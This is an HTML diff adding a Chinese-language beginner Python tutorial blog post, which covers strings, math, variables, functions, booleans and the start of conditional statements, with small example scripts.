@@ -126,6 +126,796 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-Python" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/21/Python/" class="article-date">
+  	<time datetime="2024-12-21T12:32:07.092Z" itemprop="datePublished">2024-12-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/12/21/Python/">
+        Learn Python
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>Strings</li>
+<li>Tuples</li>
+<li>Math</li>
+<li>Looping</li>
+<li>Variables&amp;Methods</li>
+<li>Importing Modules</li>
+<li>Functions</li>
+<li>Advanced Strings</li>
+<li>Boolean Expressions</li>
+<li>Dictionaries</li>
+<li>Relational Operators</li>
+<li>Sockets</li>
+<li>Conditional Statements</li>
+<li>Tool Building</li>
+<li>Lists</li>
+</ul>
+<hr>
+<h3 id="str-string-資料型別"><a href="#str-string-資料型別" class="headerlink" title="str (string)資料型別"></a><code>str</code> (string)資料型別</h3><ul>
+<li><p>用單引號 (‘ ‘) 或雙引號 (“ “) 括起來的字元序列</p>
+</li>
+<li><p>Python 中的字串是不可變的</p>
+</li>
+<li><p>創建後就無法更改</p>
+</li>
+<li><p>Creation</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_string = <span class="string">&#x27;Hello, World!&#x27;</span> <span class="keyword">or</span> my_string = <span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Accessing Characters</p>
+<ul>
+<li>您可以使用索引存取字串中的各個字符，從 0 開始</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string[<span class="number">0</span>]) </span><br><span class="line"><span class="comment"># &#x27;H&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Concatenation</p>
+<ul>
+<li>您可以使用 + 運算子連接（連接）兩個或多個字串</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greeting = <span class="string">&#x27;Hello&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;World!&#x27;</span> </span><br><span class="line"><span class="comment"># &#x27;Hello World!&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Length</p>
+<ul>
+<li>len() 函數可用於確定字串的長度（字元數）</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(my_string))</span><br><span class="line"><span class="comment"># output the length of the string</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Slicing</p>
+<ul>
+<li>您可以使用切片從字串中提取子字串，並指定開始和結束索引。</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">substring = my_string[<span class="number">7</span>:<span class="number">12</span>] </span><br><span class="line"><span class="comment"># extract the substring &#x27;World&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Methods</p>
+<ul>
+<li>Python 提供了各種內建方法來操作和轉換字串。範例包括 upper()、lower()、strip()、split()、replace() 等。</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(my_string.upper()) </span><br><span class="line"><span class="comment"># output &#x27;HELLO, WORLD!&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>String Formatting</p>
+<ul>
+<li>字串格式允許您在字串中嵌入值。這可以使用 % 運算子或 format() 方法來完成。</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&#x27;Alice&#x27;</span></span><br><span class="line">age = <span class="number">30</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My name is %s and I&#x27;m %d years old.&quot;</span> % (name, age))</span><br><span class="line"><span class="comment"># Output: My name is Alice and I&#x27;m 30 years old.</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>練習</p>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print string</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello,world!&quot;</span>)<span class="comment">#hello,world!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hello,world!&#x27;</span>)<span class="comment">#hello,world!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#triple quote for multi-line</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;this string runs </span></span><br><span class="line"><span class="string">mutiple lines!&quot;&quot;&quot;</span>) </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">this string runs </span></span><br><span class="line"><span class="string">mutiple lines!</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we can also concatenate</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;this string is &quot;</span>+<span class="string">&quot;awesome!&quot;</span>) <span class="comment">#this string is awesome!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#new line</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;test that new line out&quot;</span>) <span class="comment">#test that new line out</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><ul>
+<li><p>提供各種數學函數和常數</p>
+</li>
+<li><p>允許您在 Python 程式中執行高級數學運算</p>
+</li>
+<li><p>Math Functions in the <code>math</code> Module</p>
+<ul>
+<li>計算 x 的平方根</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.sqrt(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>x 的 y 次方</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.<span class="built_in">pow</span>(x, y)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>計算 x 的指數值 (e^x)</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.exp(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>計算 x 的自然對數（以 e 為底）</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.log(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>計算 x 以 10 為底的對數</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.log10(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>分別計算x的正弦、餘弦和正切（其中x以弧度為單位）</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.sin(x), math.cos(x), math.tan(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>將x從弧度轉換為度數</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.degrees(x)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>將x從度數轉換為弧度</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">math.radians(x)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Math Operators</p>
+<ul>
+<li>Addition (<code>+</code>)<ul>
+<li>將兩個數字相加</li>
+</ul>
+</li>
+<li>Subtraction (<code>-</code>)<ul>
+<li>一個數字減去另一個數字</li>
+</ul>
+</li>
+<li>Multiplication (<code>*</code>)<ul>
+<li>將兩個數字相乘</li>
+</ul>
+</li>
+<li>Division (<code>/</code>)<ul>
+<li>一個數字除以另一個數字</li>
+</ul>
+</li>
+<li>Integer Division (<code>//</code>)<ul>
+<li>執行除法並以整數形式返回商數（向下捨去）</li>
+</ul>
+</li>
+<li>Modulo (<code>%</code>)<ul>
+<li>傳回除法的餘數</li>
+</ul>
+</li>
+<li>Exponentiation (<code>**</code>)<ul>
+<li>計算數字的冪</li>
+</ul>
+</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="comment"># Using math functions </span></span><br><span class="line"><span class="built_in">print</span>(math.sqrt(<span class="number">25</span>)) <span class="comment"># Output: 5.0 </span></span><br><span class="line"><span class="built_in">print</span>(math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">3</span>)) <span class="comment"># Output: 8.0 </span></span><br><span class="line"><span class="built_in">print</span>(math.sin(math.pi/<span class="number">2</span>)) <span class="comment"># Output: 1.0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Using math operators </span></span><br><span class="line">x = <span class="number">10</span> y = <span class="number">3</span> <span class="built_in">print</span>(x + y) <span class="comment"># Output: 13 </span></span><br><span class="line"><span class="built_in">print</span>(x / y) <span class="comment"># Output: 3.3333333333333335 </span></span><br><span class="line"><span class="built_in">print</span>(x // y) <span class="comment"># Output: 3 </span></span><br><span class="line"><span class="built_in">print</span>(x % y) <span class="comment"># Output: 1 </span></span><br><span class="line"><span class="built_in">print</span>(x ** y) <span class="comment"># Output: 1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>+<span class="number">50</span>)<span class="comment">#100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#subtract</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>-<span class="number">50</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#multiply</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>*<span class="number">50</span>)<span class="comment">#2500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#divide</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>/<span class="number">50</span>)<span class="comment">#1.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#PEMDAS</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>+<span class="number">50</span>-<span class="number">50</span>*<span class="number">50</span>/<span class="number">50</span>)<span class="comment">#50.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#exponents</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>**<span class="number">2</span>)<span class="comment">#2500</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#modulo - takes what is left over</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span> % <span class="number">6</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#divison with remainder (or a float)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>/<span class="number">6</span>)<span class="comment">#8.333333333333334</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#no remainder</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>//<span class="number">6</span>)<span class="comment">#8</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="variables-and-methods"><a href="#variables-and-methods" class="headerlink" title="variables and methods"></a>variables and methods</h3><ul>
+<li><p>variables</p>
+<ul>
+<li>命名的儲存位置</li>
+<li>儲存資料或值</li>
+<li>在整個程式的計算中存取、修改或使用的資料的佔位符</li>
+<li>動態類型</li>
+<li>資料類型可以在程式執行期間改變</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Variable assignment</span></span><br><span class="line">x = <span class="number">10</span></span><br><span class="line">name = <span class="string">&quot;John&quot;</span></span><br><span class="line">is_true = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Variable usage</span></span><br><span class="line">y = x + <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name)</span><br><span class="line"><span class="keyword">if</span> is_true:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;The condition is true&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">x、name 和 is_true 是分配有不同資料類型</span></span><br><span class="line"><span class="string">用於計算和列印語句以執行運算和顯示值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Methods</p>
+<ul>
+<li>執行特定任務或操作的可重複使用程式碼區塊</li>
+<li>方法與物件或類別相關聯，並被呼叫來執行某些操作</li>
+<li>稱為函數</li>
+<li>內建函數和使用者定義函數都屬於方法類別</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Built-in method example</span></span><br><span class="line">numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">length = <span class="built_in">len</span>(numbers) <span class="comment">#計算列表的長度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Length:&quot;</span>, length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># User-defined method example</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):<span class="comment">#使用者定義的方法greet()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name)<span class="comment">#接受一個參數名稱並列印一條問候訊息</span></span><br><span class="line"><span class="comment">#使用參數“Alice”調用它以將“Hello, Alice”列印到控制台。</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>可以有回傳值、執行操作、接受參數等等</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">quote = <span class="string">&quot;all is fair in love and war&quot;</span></span><br><span class="line"><span class="built_in">print</span>(quote)<span class="comment">#all is fair in love and war</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#uppercase</span></span><br><span class="line"><span class="built_in">print</span>(quote.upper())<span class="comment">#ALL IS FAIR IN LOVE AND WAR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#lowercase</span></span><br><span class="line"><span class="built_in">print</span>(quote.lower())<span class="comment">#all is fair in love and war</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title case</span></span><br><span class="line"><span class="built_in">print</span>(quote.title())<span class="comment">#All Is Fair In Love And War</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#count characters</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(quote))<span class="comment">#27</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#string</span></span><br><span class="line">name = <span class="string">&quot;Heath&quot;</span></span><br><span class="line"><span class="comment">#int</span></span><br><span class="line">age =<span class="number">33</span></span><br><span class="line"><span class="comment">#float - has a decimal</span></span><br><span class="line">gpa = <span class="number">3.7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(age))<span class="comment">#33</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">30.1</span>))<span class="comment">#30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#will it round? No</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">30.9</span>))<span class="comment">#30</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;my name is &quot; + name + &quot; and I am &quot; + age + &quot; years old&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">      File &quot;/home/kali/Desktop/python/variable.py&quot;, line 29, in &lt;module&gt;</span></span><br><span class="line"><span class="string">    print(&quot;my name is &quot; + name + &quot; and I am &quot; + age + &quot; years old&quot;)</span></span><br><span class="line"><span class="string">          ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~</span></span><br><span class="line"><span class="string">TypeError: can only concatenate str (not &quot;int&quot;) to str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;my name is &quot;</span> + name + <span class="string">&quot; and I am &quot;</span> + <span class="built_in">str</span>(age) + <span class="string">&quot; years old&quot;</span>)<span class="comment">#my name is Heath and I am 33 years old</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#variable can change </span></span><br><span class="line">age +=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(age)<span class="comment">#34</span></span><br><span class="line"></span><br><span class="line">birthday = <span class="number">1</span></span><br><span class="line">age += birthday</span><br><span class="line"><span class="built_in">print</span>(age)<span class="comment">#35</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><ul>
+<li><p>執行特定任務的可重複使用程式碼區塊</p>
+</li>
+<li><p>程式碼組織為邏輯和模組化單元</p>
+</li>
+<li><p>更具可讀性、可維護性和可重複使用性</p>
+</li>
+<li><p>Function Definition</p>
+<ul>
+<li>函數是使用 <strong>def</strong>  關鍵字定義</li>
+<li>跟著函數名稱、括號和冒號</li>
+<li>具有參數（可選）和傳回語句（可選）來傳回結果</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Function Call</p>
+<ul>
+<li>要執行一個函數，您需要透過其名稱呼叫它，後面跟著括號</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">greet()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Function Parameters</p>
+<ul>
+<li>函數可以接受參數</li>
+<li>呼叫函數時保存傳遞給函數的值的變數</li>
+<li>參數可讓您根據您提供的值自訂函數的行為</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>)<span class="comment">#greet() 函數接受名為 name 的參數</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&quot;Alice&quot;</span>)<span class="comment">#使用參數（例如“Alice”）呼叫函數時,值將指派給函數體內的名稱參數</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Return Statement</p>
+<ul>
+<li>函數也可以使用 return 語句傳回值</li>
+<li>返回值可以分配給變數或直接在表達式中使用</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add_numbers</span>(<span class="params">a, b</span>):<span class="comment">#提供了一種封裝可重複使用程式碼並改進程式結構的方法</span></span><br><span class="line"><span class="comment">#接受輸入、執行計算並產生輸出</span></span><br><span class="line">    <span class="keyword">return</span> a + b <span class="comment">#返回值指派給結果變數並列印</span></span><br><span class="line"></span><br><span class="line">result = add_numbers(<span class="number">3</span>, <span class="number">4</span>)<span class="comment">#採用兩個參數（a 和 b）並傳回它們的總和</span></span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># Output: 7</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>function 中使用return跟print的時機</p>
+<ul>
+<li><p>使用return</p>
+<ul>
+<li>當函數需要返回一個值給調用者時</li>
+<li>調用者接收到函數返回值並將其儲存到變量中或做其他處理</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">a,b</span>):</span><br><span class="line">	**<span class="keyword">return</span> a+b**</span><br><span class="line"></span><br><span class="line">testfun = **test(<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># 須返回值**</span></span><br><span class="line"><span class="built_in">print</span>(testfun)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用print</p>
+<ul>
+<li>向控制台輸出某些訊息時</li>
+<li>不返回任何值給調用者</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">valu</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;HI&#x27;</span>+valu)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;404&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果函數的目的是為了得到一個結果，那麼使用 return 會比較合適</p>
+</li>
+<li><p>如果函數的目的是為了輸出資訊而不是傳回一個值，那麼直接使用 print 會比較合適。</p>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#this is a function without parameter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>():</span><br><span class="line">    name = <span class="string">&quot;heath&quot;</span> <span class="comment"># local variable</span></span><br><span class="line">    age = <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &quot;</span> + name + <span class="string">&quot; and I am &quot;</span> + <span class="built_in">str</span>(age) + <span class="string">&quot; years old&quot;</span>)<span class="comment">#my name is Heath and I am 33 years old</span></span><br><span class="line">    <span class="comment">#my name is heath and I am 30 years old</span></span><br><span class="line"></span><br><span class="line">whoami()</span><br><span class="line"><span class="comment">#print(age)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(age)</span></span><br><span class="line"><span class="string">          ^^^</span></span><br><span class="line"><span class="string">NameError: name &#x27;age&#x27; is not defined</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addonehundured</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num+<span class="number">100</span>)<span class="comment">#200</span></span><br><span class="line"></span><br><span class="line">addonehundured(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="built_in">print</span>(x+y)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutiply</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*y</span><br><span class="line"></span><br><span class="line">mutiply(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(mutiply(<span class="number">7</span>,<span class="number">7</span>))<span class="comment">#49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seqroot</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(x ** <span class="number">.5</span>)<span class="comment">#8.0</span></span><br><span class="line"></span><br><span class="line">seqroot(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#new line</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nl</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">nl()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Boolean-Expressions-and-Relational-Operators"><a href="#Boolean-Expressions-and-Relational-Operators" class="headerlink" title="Boolean Expressions and Relational Operators"></a><strong>Boolean Expressions and Relational Operators</strong></h3><p><img src="/img/Py_Untitled.png" alt="Untitled"></p>
+<ul>
+<li>boolean expressions<ul>
+<li>計算結果為 True 或 False</li>
+<li>條件語句和邏輯運算</li>
+<li>根據某些條件的真假做出決策</li>
+<li>邏輯運算子組合關係表達式</li>
+<li>Logical AND (<code>and</code>)<ul>
+<li>如果兩個操作數都為 True，則傳回 True。</li>
+</ul>
+</li>
+<li>Logical OR (<code>or</code>)<ul>
+<li>如果至少有一個運算元為 True，則傳回 True。</li>
+</ul>
+</li>
+<li>Logical NOT (<code>not</code>)<ul>
+<li>對操作數的值取反。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Relational operators<ul>
+<li>比較值和建立boolean expressions</li>
+<li>Equality (<code>==</code>)<ul>
+<li>檢查兩個值是否相等</li>
+</ul>
+</li>
+<li>Inequality (<code>!=</code>)<ul>
+<li>檢查兩個值是否不相等</li>
+</ul>
+</li>
+<li>Greater than (<code>&gt;</code>)<ul>
+<li>檢查左側值是否大於右側值</li>
+</ul>
+</li>
+<li>Less than (<code>&lt;</code>)<ul>
+<li>檢查左側值是否小於右側值</li>
+</ul>
+</li>
+<li>Greater than or equal to (<code>&gt;=</code>)<ul>
+<li>檢查左側值是否大於或等於右側值</li>
+</ul>
+</li>
+<li>Less than or equal to (<code>&lt;=</code>)<ul>
+<li>檢查左側值是否小於或等於右側值</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#兩個變數 x 和 y</span></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Relational operators</span></span><br><span class="line"><span class="comment"># 比較它們的值並建立布林表達式</span></span><br><span class="line"><span class="built_in">print</span>(x == y)   <span class="comment"># Output: False</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y)    <span class="comment"># Output: True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Boolean expressions</span></span><br><span class="line"><span class="comment"># 使用邏輯運算子（and、or、not）來組合關係表達式並評估整體真值</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y <span class="keyword">and</span> y &gt; <span class="number">0</span>)    <span class="comment"># Output: True</span></span><br><span class="line"><span class="built_in">print</span>(x &lt; y <span class="keyword">or</span> y &lt; <span class="number">0</span>)     <span class="comment"># Output: True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> (x == y))       <span class="comment"># Output: True</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Boolean expressions (True or False)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Boolean expressions:&quot;</span>)</span><br><span class="line"></span><br><span class="line">bool1 = <span class="literal">True</span></span><br><span class="line">bool2 = <span class="number">3</span>*<span class="number">3</span> == <span class="number">9</span></span><br><span class="line">bool3 = <span class="literal">False</span></span><br><span class="line">bool4 = <span class="number">3</span>*<span class="number">3</span> != <span class="number">9</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bool1,bool2,bool3,bool4)<span class="comment">#True True False False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(bool1))<span class="comment">#&lt;class &#x27;bool&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line">bool5 = <span class="string">&quot;True&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(bool5)) <span class="comment">#&lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Relational and Boolean operators</span></span><br><span class="line">greater_than = <span class="number">7</span> &gt; <span class="number">5</span></span><br><span class="line">less_than = <span class="number">5</span> &lt; <span class="number">7</span></span><br><span class="line">greater_than_equal_to = <span class="number">7</span> &gt;=<span class="number">7</span></span><br><span class="line">less_than_equal_to = <span class="number">7</span> &lt;= <span class="number">7</span></span><br><span class="line"></span><br><span class="line">test_and = <span class="literal">True</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="comment">#True</span></span><br><span class="line">test_and2 = <span class="literal">True</span> <span class="keyword">and</span> <span class="literal">False</span> <span class="comment">#False</span></span><br><span class="line">test_or = <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">True</span> <span class="comment">#True</span></span><br><span class="line">test_or2 = <span class="literal">True</span> <span class="keyword">or</span> <span class="literal">False</span> <span class="comment">#True</span></span><br><span class="line"></span><br><span class="line">test_not = <span class="keyword">not</span> <span class="literal">True</span> <span class="comment">#False</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Conditional-Statements"><a href="#Conditional-Statements" class="headerlink" title="Conditional Statements"></a><strong>Conditional Statements</strong></h3><ul>
+<li><p>根據特定條件執行不同的操作</p>
+</li>
+<li><p>允許您在滿足某些條件時透過執行特定的程式碼區塊</p>
+</li>
+<li><p>if Statement:</p>
+<ul>
+<li>if 語句是最基本的條件語句。如果給定條件為真，它會執行一段程式碼。</li>
+</ul>
+  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> condition:</span><br><span class="line">    <span class="comment"># code to be executed if the condition is true</span></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">x = <span class="number">5</span></span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;x is positive&quot;</span>)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>如果條件 x &gt; 0 為 true，則會執行 if block (print(“x is Positive”)) 內的程式碼</li>
+</ul>
+</li>
+<li><p>if-else Statement:</p>
+<ul>
+<li>指定兩個不同的程式碼區塊</li>
+<li>一個在條件為 true 時執行，另一個在條件為 false 時執行</li>
+</ul>
